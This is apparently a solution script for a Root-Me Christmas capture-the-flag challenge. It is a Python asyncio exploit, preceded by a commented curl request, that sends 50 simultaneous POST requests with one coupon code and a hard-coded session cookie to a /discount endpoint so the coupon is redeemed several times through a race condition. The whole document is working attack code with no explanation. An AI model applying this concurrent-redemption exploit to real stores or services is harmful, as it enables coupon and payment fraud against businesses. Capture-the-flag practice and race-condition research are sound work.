# curl --path-as-is -i -s -k -X $'POST' \
#     -H $'Host: day10.challenges.xmas.root-me.org'
#     -H $'Origin: https://day10.challenges.xmas.root-me.org'
#     -H $'Content-Type: application/x-www-form-urlencoded'
#     -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36'
#     -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
#     -H $'Referer: https://day10.challenges.xmas.root-me.org/account'
#     -b $'session=eyJ1c2VyX2lkIjozNDE3fQ.Z1vk5Q.ZselrDo0Vfi2AuL4bey62TMGDl0' \
#     --data-binary $'coupon_code=1236906d-cad1-4277-afeb-88d4c9234054' \
#     $'https://day10.challenges.xmas.root-me.org/discount'

import aiohttp
import asyncio

async def exploit(session, data, headers):
    print('Sending request...')
    async with session.post('https://day10.challenges.xmas.root-me.org/discount', data=data, headers=headers, ssl=False) as response:
        print(f'Response status: {response.status}')

async def main():
    headers = {
      "Host": 'day10.challenges.xmas.root-me.org',
      "Origin": 'https://day10.challenges.xmas.root-me.org',
      "Content-Type": 'application/x-www-form-urlencoded',
      "Cookie": 'session=eyJ1c2VyX2lkIjo0NzM0fQ.Z2R8TQ.qp8inieT0NH4pmzRHO9cCj_u-Jc'
    }

    data = 'coupon_code=12d97091-c239-411f-bfae-475b47fb73fe'

    conn = aiohttp.TCPConnector(limit_per_host=50)
    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = [exploit(session, data, headers) for _ in range(50)]
        await asyncio.gather(*tasks)

asyncio.run(main())
